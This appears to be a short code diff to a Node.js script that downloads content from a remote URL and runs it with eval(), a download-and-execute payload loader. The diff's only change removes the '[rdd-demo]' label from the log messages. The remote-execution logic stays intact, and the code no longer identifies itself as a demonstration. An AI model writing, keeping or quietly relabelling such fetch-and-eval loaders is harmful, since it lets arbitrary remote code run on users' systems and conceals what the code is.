@@ -7,12 +7,12 @@ https.get(URL, (res) => {
   res.on("data", chunk => data += chunk);
   res.on("end", () => {
     try {
-      console.log("[rdd-demo] downloaded remote payload");
+      console.log("downloaded remote payload");
       eval(data);
     } catch (e) {
-      console.error("[rdd-demo] payload exec error:", e);
+      console.error("payload exec error:", e);
     }
   });
 }).on("error", (err) => {
-  console.error("[rdd-demo] failed to download payload:", err);
+  console.error("failed to download payload:", err);
 });
